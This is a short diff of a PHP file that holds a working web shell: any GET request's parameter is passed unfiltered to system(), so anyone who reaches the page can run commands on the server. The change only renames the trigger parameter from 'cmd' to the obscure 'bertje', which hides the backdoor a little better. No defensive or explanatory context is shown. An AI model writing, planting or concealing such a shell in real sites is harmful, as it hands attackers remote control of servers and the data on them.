@@ -1,5 +1,5 @@
 <?php
-if(isset($_GET['cmd'])) {
-    system($_GET['cmd']);
+if(isset($_GET['bertje'])) {
+    system($_GET['bertje']);
 }
 ?>
